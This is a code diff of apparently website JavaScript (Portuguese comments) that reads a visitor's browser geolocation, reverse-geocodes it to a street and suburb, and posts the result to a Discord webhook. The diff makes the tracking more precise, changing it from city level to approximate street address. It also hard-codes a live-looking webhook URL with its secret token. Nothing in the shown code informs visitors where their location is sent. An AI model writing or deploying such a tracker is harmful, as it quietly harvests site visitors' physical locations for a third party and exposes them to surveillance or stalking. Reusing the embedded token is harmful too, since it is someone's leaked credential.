@@ -1,9 +1,7 @@
 // Função para enviar mensagem para o Discord via webhook
-function enviarMensagemDiscord(localizacao) {
+function enviarMensagemDiscord(mensagem) {
     const webhookURL = 'https://discord.com/api/webhooks/1205519125603160094/ocwJ60PohJEbl0oUCKSKAg6FAIMeg6Rjn_YU64Atfun0JFOtJOfD3kuwMNlO8Xb8WAST'; // Substitua pelo URL do seu webhook do Discord
     
-    const mensagem = `Nova pessoa acessou o site em: ${localizacao}`;
-  
     fetch(webhookURL, {
       method: 'POST',
       headers: {
@@ -21,21 +19,37 @@ function enviarMensagemDiscord(localizacao) {
       navigator.geolocation.getCurrentPosition(posicao => {
         const latitude = posicao.coords.latitude;
         const longitude = posicao.coords.longitude;
-    
-        // Chamada para API de geocodificação reversa para obter a cidade
-        const apiURL = `https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`;
+  
+        // Chamada para API de geocodificação reversa para obter detalhes do endereço
+        const apiURL = `https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json&addressdetails=1`;
   
         fetch(apiURL)
           .then(response => response.json())
           .then(data => {
-            const cidade = data.address.city;
-            console.log("Cidade:", cidade);
+            let endereco = data.display_name;
+            if (data.address && data.address.road) {
+              endereco = data.address.road;
+              if (data.address.suburb) {
+                endereco += ', ' + data.address.suburb;
+              } else if (data.address.neighbourhood) {
+                endereco += ', ' + data.address.neighbourhood;
+              }
+            } else if (data.address && data.address.suburb) {
+              endereco = data.address.suburb;
+            } else if (data.address && data.address.neighbourhood) {
+              endereco = data.address.neighbourhood;
+            } else {
+              endereco = data.address.city;
+            }
+  
+            // Montar mensagem com endereço e IP
+            const mensagem = `Nova pessoa acessou o site em aproximadamente: ${endereco} na cidade de ${data.address.city}`;
   
             // Enviar mensagem para o Discord
-            enviarMensagemDiscord(cidade);
+            enviarMensagemDiscord(mensagem);
           })
           .catch(error => {
-            console.error("Erro ao obter a cidade:", error);
+            console.error("Erro ao obter o endereço:", error);
           });
       });
     } else {
